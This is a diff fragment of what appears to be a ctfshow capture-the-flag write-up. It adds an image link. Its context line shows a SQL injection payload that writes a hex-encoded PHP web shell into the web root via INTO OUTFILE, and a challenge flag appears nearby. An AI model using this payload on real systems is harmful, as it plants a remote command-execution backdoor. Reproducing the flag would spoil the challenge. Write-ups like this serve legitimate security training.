@@ -652,3 +652,4 @@ C64File "');select 0x3c3f3d60245f4745545b315d603f3e into outfile '/var/www/html/
 
 ctfshow{2a405738-c872-412b-9f5e-57e422864fb4}
 
+![image-20251222092031208](./../../../public/pcb5-ez_java/image-20251222092031208.png)
